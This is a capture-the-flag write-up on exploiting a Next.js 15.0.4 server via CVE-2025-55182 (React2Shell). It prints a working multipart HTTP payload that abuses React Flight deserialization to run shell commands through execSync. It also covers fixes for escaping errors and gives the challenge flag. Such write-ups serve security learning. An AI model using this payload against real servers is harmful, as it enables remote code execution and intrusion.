# Server Components

## ANALYZE

<figure><img src="../../.gitbook/assets/image (776).png" alt=""><figcaption></figcaption></figure>



In this challenge, when first accessing the website, we can see that it is only a simple landing page with no obvious functionality. Therefore, the next step is to fingerprint the technology stack used by the target.

<figure><img src="../../.gitbook/assets/image (775).png" alt=""><figcaption></figcaption></figure>

Based on the identified technologies, we obtained several important observations:

* The application is built with Next.js and React
* The Next.js version is `15.0.4`
* This strongly suggests that the target may be vulnerable to the React-to-RCE issue

That assumption turned out to be correct. The application is vulnerable to `CVE-2025-55182`.

<figure><img src="../../.gitbook/assets/image (777).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (778).png" alt=""><figcaption></figcaption></figure>



### poc

```
POST / HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

We can then adapt this PoC to the current challenge.

The next step was to search for the flag. I first tested the command execution primitive with a simple command: `id`

<figure><img src="../../.gitbook/assets/image (779).png" alt=""><figcaption></figcaption></figure>

The next step is to search for the flag. I initially tried the following command:

```
find / -type f -name "flag.txt" 2>dev/null
```

However, I noticed that it did not work.

<figure><img src="../../.gitbook/assets/image (780).png" alt=""><figcaption></figcaption></figure>

So why did this happen?

The root cause lies in how the command was embedded inside the \_prefix string.

Originally, the command was written directly like this:

JavaScript

<pre class="language-javascript"><code class="lang-javascript"><strong>execSync('find / -type f -name "flag.txt" 2>dev/null')
</strong></code></pre>

Because the entire payload is nested inside **JSON** and then sent via **multipart/form-data**, the double quotes (") and shell redirection symbols (>, /) are prone to incorrect escaping or parsing by either the JSON parser or the React Flight deserializer.

As a result, the actual command that gets executed on the server often becomes malformed. For example, it may end up being interpreted as:

```bash
find / -type f -name flag.txt 2>dev/null
```

(missing the quotes around the filename and the slash in 2>/dev/null).

This causes the execSync() call to fail silently or return an error/empty output. Consequently, the variable res contains either an error message or an empty string, which then gets leaked through the NEXT\_REDIRECT error mechanism — producing unexpected digest values such as "24C0734465".

Here is the problematic \_prefix snippet:

JavaScript

```javascript
"_prefix": "var cmd = \"find / -name '*flag*' 2>/dev/null || echo 'no flag found'\""
```

```javascript
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var cmd = \"find / -name '*flag*' 2>/dev/null || echo 'no flag found'\"; var res = process.mainModule.require('child_process').execSync(cmd, {timeout: 15000}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {digest: `${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

<figure><img src="../../.gitbook/assets/image (781).png" alt=""><figcaption></figcaption></figure>



Through this challenge, I learned an important lesson beyond just finding the right gadget:

Even when the exploit logic is correct, **string escaping and payload construction** play a critical role. Since the payload must pass through multiple layers — JSON, multipart/form-data, and the React Flight deserializer — a single misplaced quote, backtick, or redirection character can easily break the shell command before it reaches execSync().

This challenge reinforced that in React2Shell (and similar unsafe deserialization exploits), directly embedding shell commands inside JavaScript strings is highly error-prone.

**Key takeaway:** Always use an intermediate variable with backticks (\`) to build the command. This significantly reduces escaping issues and increases reliability.



## EXPLOIT



<figure><img src="../../.gitbook/assets/image (782).png" alt=""><figcaption></figcaption></figure>



## FLAG

```
CIT{R3aCt_1s_Vu1n3r@bl3}
```
